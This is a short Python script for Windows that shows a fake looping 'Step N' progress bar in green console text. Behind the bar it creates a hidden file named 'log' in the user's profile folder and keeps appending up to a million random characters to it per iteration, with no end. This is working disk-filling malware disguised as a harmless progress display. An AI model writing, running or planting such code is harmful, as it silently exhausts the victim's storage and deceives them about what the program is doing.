import getpass, random, os, string, subprocess
os.system('color 0a')
path = f'C:\\Users\\{getpass.getuser()}\\log'
file = open(path, 'a')
subprocess.check_call(['attrib', '+H', path])
step = 1
percent = 0
while True:
	os.system('cls')
	num = round(percent / 5)
	print(f'''\nStep {step}\n[{'-' * num}{' ' * (20 - num)}] {percent}%''')
	file.write(''.join(f'{random.choice(string.printable)}' for _ in range(random.randint(10000, 1000000))))
	percent += 1
	if percent > 100:
		percent = 0
		step += 1
